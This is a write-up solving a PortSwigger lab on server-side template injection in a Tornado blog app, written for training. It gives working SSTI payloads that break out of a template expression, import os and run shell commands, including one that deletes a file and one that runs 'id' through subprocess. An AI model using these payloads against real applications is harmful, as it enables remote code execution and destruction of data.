# Lab 2: Basic Server-Side Template Injection (Code Context)

**Category:** Server-Side Template Injection (SSTI)
**Difficulty:** Practitioner
**Lab link:** [Basic server-side template injection (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)

## Overview

The app lets users set a blog post author display preference. This preference value is injected directly inside a Tornado template expression — the injection point is *inside* `{{ }}` (code context), not in plain text. Breaking out of the expression and injecting a statement block achieves RCE.

**Engine:** Tornado (Python)

## Key Concepts

- **Code context vs plain text context:** in a plain-text position the injection appears in the template output directly. In code context, the input lands inside an existing `{{ }}` expression — you must first escape the expression before injecting new template directives.
- **Tornado template syntax:**
  - `{{ expression }}` — evaluates and outputs Python expression
  - `{% statement %}` — executes Python statement (import, for, if, etc.)
  - No sandbox — full Python execution environment
- **Escaping code context:** injecting `}}` closes the current expression, then new blocks can be opened freely.

## Solution

### Step 1 — Identify the injection point

Log in as `wiener` / `peter`. Go to account settings — there's a blog post author display preference. Change it and view a blog post to see where the value is reflected.

### Step 2 — Confirm SSTI

Set the preference to:
```
}}{{7*7
```
View a blog post. If `49` appears in the author field → Tornado SSTI confirmed in code context.

### Step 3 — RCE payload

POST to `/my-account/change-blog-post-author-display`:
```
blog-post-author-display=}}{%import os%}{{os.system('rm /home/carlos/morale.txt')&csrf=TOKEN
```

### Step 4 — Trigger execution

Navigate to any blog post. The template renders with the injected payload:
```
{{author_display}}{%import os%}{{os.system('rm /home/carlos/morale.txt')}}
```
The command executes. Lab solved.

## Why `os.system()` Works Here

`os.system()` runs the shell command and returns an integer exit code. The `{{ }}` block outputs `0` (success) but the side effect — deleting the file — is what matters.

For output-returning commands use backticks or `subprocess`:
```
}}{%import subprocess%}{{subprocess.check_output('id',shell=True).decode()
```

## Remediation

- Never interpolate user input into the template string itself — pass it as a context variable.
- If user-controlled display preferences must exist, validate against an explicit allowlist of field names.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/server-side-template-injection/lab-02-basic-tornado-code-context/solve.py)

Logs in, sets the malicious author display preference, then fetches a blog post to trigger execution.

## Key Takeaways

- Code context SSTI requires breaking out of the existing expression (`}}`) before injecting new directives.
- Tornado templates execute raw Python — `import os; os.system(...)` is all that's needed.
- The payload executes at render time (when a blog post is viewed), not at save time.
